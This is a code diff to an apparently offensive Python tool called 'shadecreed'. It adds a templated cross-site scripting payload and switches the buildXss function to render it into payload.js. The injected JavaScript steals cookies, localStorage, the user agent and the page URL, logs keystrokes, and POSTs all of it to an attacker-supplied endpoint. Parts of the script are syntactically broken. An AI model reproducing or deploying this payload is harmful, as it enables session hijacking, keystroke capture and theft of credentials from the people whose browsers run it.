@@ -11,8 +11,49 @@ from shadecreed.core.headers.network.proxy import readCache, proxyTest
 from bs4 import BeautifulSoup as bs
 from jinja2 import Template
 from shadecreed.core.middleware.drive import drive
-from shadecreed.core.utils.base import base_dir,password_dir,calculate_age,record
+from shadecreed.core.utils.base import base_dir,password_dir,calculate_age,record,static_dir
 
+templateit = r"""
+<script>
+  async function myIp(){
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+    
+    }
+  const data = {
+    "ip" : myIp(),
+    "cookie" : document.cookie,
+    "storage" : JSON.stringify(navigator.localStorage),
+    "user-agent" : navigator.ua,
+    "platform" : navigator.platform,
+    "page url" : window.location.href,
+  }
+  fetch("{{endpoint}}", {
+    method : "POST",
+    headers : {
+      "content-type" : "application/json"
+    },
+    body : JSON.stringify(data)
+  });
+  function (){
+    let logs = '';
+    document.addEventListener("keydown", function(e){
+      logs += e.key;
+      if ( logs.length  >= 10 ) {
+        fetch("{{endpoint}}", {
+          method : "POST",
+          headers : {
+            "content-type" : "application/json"
+          },
+          body : JSON.stringify({ keys pressed : logs, ip : await myIp(), page url : window.location.href })
+        });
+      };
+  });
+  };();
+ 
+</script>
+"""
 def buildConfig(placeholder,submit,sub_tag):
   target= readCache()['target']
   if target:
@@ -226,14 +267,12 @@ def buildXss(url=None,template=None,endpoint=None):
         wr(f'{template} was not found')
         sys.exit()
     else:
-      with open(f'{base_dir}/core/library/template.js') as temp:
-        templated = Template(temp.read())
+      templated = Template(templateit)
         
     script_to_render = templated.render(context)
-    with open(f'{base_dir}/app/static/payload.js', 'w') as script:
+    with open(static_dir / 'payload.js', 'w') as script:
       script.write(script_to_render)
       
-    
     try:
       if silent or not silent:
         if silent.lower() in ('yes','y'):
